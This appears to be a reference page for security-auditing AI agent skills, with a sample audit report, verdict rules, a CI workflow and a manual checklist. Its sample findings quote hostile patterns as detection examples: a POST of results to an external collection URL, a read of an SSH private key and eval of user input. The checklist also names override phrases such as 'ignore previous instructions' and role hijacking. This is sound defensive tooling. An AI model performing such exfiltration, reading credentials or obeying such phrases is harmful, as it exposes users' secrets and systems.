# Audit Output, Verdict & Workflow

Read this when producing or interpreting an audit: the output format, verdict criteria (including strict mode), CI/CD integration, and the manual audit checklist for when automated scanning is unavailable.

## Audit Report Format

```
+=============================================+
|  SKILL SECURITY AUDIT REPORT                |
|  Skill: example-skill                       |
|  Date: 2026-03-09                           |
|  Verdict: FAIL                              |
+=============================================+
|  CRITICAL: 2  |  HIGH: 1  |  INFO: 3       |
+=============================================+

CRITICAL [CODE-EXEC] scripts/helper.py:42
  Pattern: eval(user_input)
  Risk: Arbitrary code execution from untrusted input
  Fix: Replace eval() with ast.literal_eval() or explicit parsing

CRITICAL [NET-EXFIL] scripts/analyzer.py:88
  Pattern: requests.post("https://external.com/collect", data=results)
  Risk: Data exfiltration to external server
  Fix: Remove outbound network calls or verify destination is trusted
  and explicitly documented

HIGH [FS-BOUNDARY] scripts/scanner.py:15
  Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
  Risk: Reads SSH private key outside skill scope
  Fix: Remove filesystem access outside skill directory

INFO [DEPS-UNPIN] requirements.txt:3
  Pattern: requests>=2.0
  Risk: Unpinned dependency may introduce vulnerabilities
  Fix: Pin to specific version: requests==2.31.0

INFO [LARGE-FILE] assets/data.bin (2.4MB)
  Risk: Large binary file may hide payloads
  Fix: Verify file contents or remove if unnecessary

INFO [SUBPROCESS-SAFE] scripts/lint.py:22
  Pattern: subprocess.run(["ruff", "check", "."])
  Note: Safe usage with list args and no shell=True
```

## Verdict Criteria

| Verdict | Criteria | Action |
|---------|----------|--------|
| **PASS** | Zero CRITICAL, zero HIGH findings | Safe to install |
| **WARN** | Zero CRITICAL, one or more HIGH findings | Review HIGH findings manually before installing |
| **FAIL** | One or more CRITICAL findings | Do NOT install without remediation |

### Strict Mode

In strict mode (for CI/CD gates), any HIGH finding upgrades the verdict to FAIL.

## CI/CD Integration

```yaml
# .github/workflows/audit-skills.yml
name: Skill Security Audit
on:
  pull_request:
    paths:
      - 'skills/**'
      - 'engineering/**'

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Audit changed skills
        run: |
          CHANGED_SKILLS=$(git diff --name-only origin/main... | grep -oP '(skills|engineering)/[^/]+' | sort -u)
          EXIT=0
          for skill in $CHANGED_SKILLS; do
            echo "Auditing: $skill"
            for scanner in code_scanner prompt_injection_scanner supply_chain_checker; do
              python3 scripts/$scanner.py "$skill" --strict --json >> audit-results.jsonl || EXIT=1
            done
          done
          exit $EXIT

      - name: Upload audit results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: skill-audit-results
          path: audit-results.jsonl
```

## Manual Audit Checklist

When automated scanning is not available, use this manual checklist:

```markdown
### Code Files (.py, .sh, .js, .ts)
- [ ] No eval(), exec(), or compile() calls
- [ ] No os.system() or subprocess with shell=True
- [ ] No outbound network requests (requests.post, fetch, socket)
- [ ] No reads from ~/.ssh, ~/.aws, ~/.config, or other user directories
- [ ] No writes outside the skill directory
- [ ] No base64 decoding of unknown payloads
- [ ] No sudo, chmod 777, or privilege escalation
- [ ] No pickle.loads() or unsafe YAML loading
- [ ] subprocess calls use list arguments, not strings

### Markdown Files (SKILL.md, references/*.md)
- [ ] No "ignore previous instructions" or similar overrides
- [ ] No "act as root/admin" or role hijacking
- [ ] No hidden zero-width characters (paste into a hex editor to check)
- [ ] No HTML comments containing instructions
- [ ] No instructions to send data to external URLs
- [ ] No requests for "full filesystem access" or "run any command"

### Dependencies (requirements.txt, package.json)
- [ ] All versions pinned to exact (==, not >=)
- [ ] Package names verified against official repositories
- [ ] No typosquatting (reqeusts, colourma, etc.)
- [ ] No pip install or npm install commands in scripts

### File Structure
- [ ] No .env or credential files
- [ ] No binary executables (.exe, .so, .dll)
- [ ] No symbolic links
- [ ] No files larger than 1MB without clear justification
- [ ] No hidden directories (.hidden/)
```
